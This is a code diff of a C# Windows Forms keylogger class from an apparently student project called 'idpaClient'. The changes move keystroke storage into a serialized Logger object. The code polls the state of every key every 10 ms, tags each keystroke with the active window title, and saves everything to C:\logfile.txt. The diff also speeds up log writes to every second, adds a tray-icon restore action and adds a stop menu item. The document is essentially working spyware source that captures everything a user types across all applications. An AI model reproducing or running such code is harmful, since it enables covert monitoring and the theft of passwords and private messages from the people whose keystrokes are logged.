@@ -9,17 +9,19 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Diagnostics;
 
 namespace idpaClient
 {
     public partial class Keylogger : Form
     {
         public const int KEY_LOG_TIMER = 10;
-        public const int LOG_WRITE_TIMER = 30000; //30 sek
+        public const int LOG_WRITE_TIMER = 1000; //30 sek
         private const string LOG_PATH = @"C:\logfile.txt";
 
-        private StringBuilder keyBuffer;
+        //private StringBuilder keyBuffer;
         private string activeWindow;
+        private Logger logger;
 
         public Keylogger()
         {
@@ -40,18 +42,16 @@ namespace idpaClient
 
         private void Keylogger_Load(object sender, EventArgs e)
         {
-            keyBuffer = new StringBuilder();
+            logger = new Logger();
             activeWindow = "";
+            logger = Serilizer.getDataFromFile(LOG_PATH, logger);
         }
 
         void CreateLog(string file)
         {
             try
             {
-                StreamWriter sw = new StreamWriter(file, true);//I used true to append log to file
-                sw.Write(keyBuffer.ToString());
-                sw.Close();
-                keyBuffer.Clear(); // reset buffer
+                Serilizer.writeDataToFile(LOG_PATH, logger);
             }
             catch
             {
@@ -60,18 +60,20 @@ namespace idpaClient
 
         private void key_Tick(object sender, EventArgs e)
         {
-            if (activeWindow != GetActiveWindowTitle())
+            if (activeWindow != GetActiveWindowTitle() && GetActiveWindowTitle() != null)
             {
                 activeWindow = GetActiveWindowTitle();
-                keyBuffer.Append("\r\n\r\n" + activeWindow + "\r\n");
+                logger.applicationLog.Add(new ApplicationLog());
+
+                logger.applicationLog.Last<ApplicationLog>().applicationName = activeWindow;
+                logger.applicationLog.Last<ApplicationLog>().date = DateTime.Now;
             }
             
             foreach (System.Int32 i in Enum.GetValues(typeof(Keys))) //Iterate through each key to know whether it was pressed or not
             {
                 if (GetAsyncKeyState(i) == -32767)   //-32767(minimum value) indicates that key was pressed since we last called this function
                 {
-                    keyBuffer.Append(Enum.GetName(typeof(Keys), i));
-                    keyBuffer.Append(' ');
+                    logger.applicationLog.Last<ApplicationLog>().keyList.Add(Enum.GetName(typeof(Keys), i));
                 }
             }
         }
@@ -104,6 +106,7 @@ namespace idpaClient
         private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
         {
             this.Opacity = 1;
+            this.BringToFront();
         }
 
         private string GetActiveWindowTitle()
@@ -117,6 +120,14 @@ namespace idpaClient
                 return Buff.ToString();
             }
             return null;
+        }
+
+        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            key.Enabled = false;
+            log.Enabled = false;
+            button1.Enabled = true;
+            button2.Enabled = false;
         }
     }
 }
